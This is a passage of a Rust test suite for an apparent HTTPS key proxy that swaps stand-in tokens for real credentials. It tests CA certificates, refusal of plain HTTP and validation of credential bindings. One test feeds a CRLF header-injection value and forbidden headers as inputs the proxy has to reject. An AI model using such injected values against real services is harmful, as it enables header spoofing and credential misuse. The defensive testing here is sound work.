    assert_eq!(status, StatusCode::OK);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn plain_http_is_refused() {
    let rig = rig().await;
    let mut tcp = TcpStream::connect(rig.addr).await.unwrap();
    tcp.write_all(format!("GET http://{API}/ HTTP/1.1\r\nHost: {API}\r\n\r\n").as_bytes())
        .await
        .unwrap();
    let mut reply = String::new();
    tcp.read_to_string(&mut reply).await.unwrap();
    assert!(reply.starts_with("HTTP/1.1 405"), "{reply}");
    assert!(rig.up.seen().is_empty());
}

#[test]
fn the_ca_and_its_leaves_are_strict() {
    let proxy = KeyProxy::new().unwrap();
    let leaf = proxy.inner.ca.leaf_der(API);
    let has = |der: &[u8], oid: &[u8]| der.windows(oid.len()).any(|w| w == oid);
    // 2.5.29.35 authorityKeyIdentifier, 2.5.29.14 subjectKeyIdentifier,
    // 2.5.29.17 subjectAltName, 2.5.29.37 extKeyUsage.
    for oid in [
        [0x55, 0x1d, 0x23],
        [0x55, 0x1d, 0x0e],
        [0x55, 0x1d, 0x11],
        [0x55, 0x1d, 0x25],
    ] {
        assert!(has(&leaf, &[&[0x06, 0x03][..], &oid].concat()), "{oid:x?}");
    }
    assert!(proxy.ca_pem().starts_with("-----BEGIN CERTIFICATE-----"));
    assert_ne!(
        KeyProxy::new().unwrap().ca_pem(),
        proxy.ca_pem(),
        "each boot has its own CA"
    );
}

#[test]
fn a_delivery_checks_every_use() {
    let proxy = KeyProxy::new().unwrap();
    proxy.deliver("ada", vec![github_token(&[API])]).unwrap();
    let bad = |edit: fn(&mut Binding)| {
        let mut binding = github_token(&[API]);
        edit(&mut binding);
        proxy.deliver("ada", vec![binding]).is_err()
    };
    assert!(bad(
        |b| b.use_.origins = vec!["http://api.example.test".into()]
    ));
    assert!(bad(
        |b| b.use_.origins = vec!["https://api.example.test/path".into()]
    ));
    assert!(bad(
        |b| b.use_.origins = vec!["https://user@api.example.test".into()]
    ));
    assert!(bad(|b| b.use_.origins = Vec::new()));
    assert!(bad(|b| b.use_.header = "Host".into()));
    assert!(bad(|b| b.use_.header = "Content-Length".into()));
    assert!(bad(|b| b.use_.schemes = vec!["Bearer token".into()]));
    assert!(bad(|b| b.value = "ghp_abc\r\nX: y".into()));
    assert!(bad(|b| b.value = "short".into()));
    assert!(bad(|b| b.use_.refuse = Some(vec!["authorizations".into()])));
    // A refused delivery leaves what was there.
    assert!(proxy.holds("ada"));
    // A shape too short for a safe stand-in gets a longer one, not a refusal.
    let mut short = github_token(&[API]);
    short.use_.stand_in = Some(StandIn {
        prefix: "sk-".into(),
        length: 12,
    });
    proxy.deliver("bob", vec![short]).unwrap();
    let stand_in = proxy.begin("bob").stand_ins.remove(0).1;
    assert!(
        stand_in.starts_with("sk-") && stand_in.len() == 23,
        "{stand_in}"
    );
    // The origin spellings are one.
    let mut binding = github_token(&[]);
    binding.use_.origins = vec!["HTTPS://API.Example.TEST:443/".into()];
    proxy.deliver("ada", vec![binding]).unwrap();
    let run = proxy.begin("ada");
    assert!(
        proxy
            .table()
            .is_bound(&run.user, "https://api.example.test")
    );
    // None is nothing held.
    proxy.deliver("ada", Vec::new()).unwrap();
    assert!(!proxy.holds("ada"));
}

#[test]
fn the_desk_shape_parses() {
    let use_: Use = serde_json::from_value(serde_json::json!({
        "origins": ["https://api.github.com"],
        "header": "Authorization",
        "schemes": ["Bearer", "token", "Basic"],
        "standIn": {"prefix": "ghp_", "length": 40},
        "refuse": ["/authorizations", "/app/installations/*/access_tokens"]
    }))
    .unwrap();
    assert_eq!(use_.stand_in.unwrap().length, 40);
    assert_eq!(use_.refuse.unwrap().len(), 2);
    let bare: Use = serde_json::from_value(serde_json::json!({
        "origins": ["https://api.anthropic.com"],
        "header": "x-api-key",
        "schemes": []
    }))
    .unwrap();
    assert!(bare.schemes.is_empty() && bare.refuse.is_none());
}
